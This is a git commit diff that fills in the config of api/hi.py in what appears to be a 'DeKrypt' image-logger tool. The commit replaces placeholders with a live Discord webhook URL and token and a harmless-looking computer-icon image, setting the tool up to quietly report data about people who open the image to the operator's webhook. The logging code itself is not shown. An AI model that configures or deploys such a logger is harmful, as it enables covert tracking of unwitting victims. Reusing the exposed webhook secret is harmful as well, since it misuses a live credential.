c1a408e6d35851f65dbf55749b1b94e525964ab4
zks-2 <hhalyafei24@gmail.com>
2025-12-03 14:31:31 +0300

    Update hi.py

--- api/hi.py
+++ api/hi.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1445738080051920968/-QtDjLYYMDgEpJiao5JyFQoUqMcbJ6l0TBMQxSyeV8goX5OSuttqXD2vFkHbJXfuIhoK",
+    "image": "https://static.vecteezy.com/system/resources/thumbnails/044/812/078/small/sleek-desktop-computer-icon-on-a-transparent-background-png.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
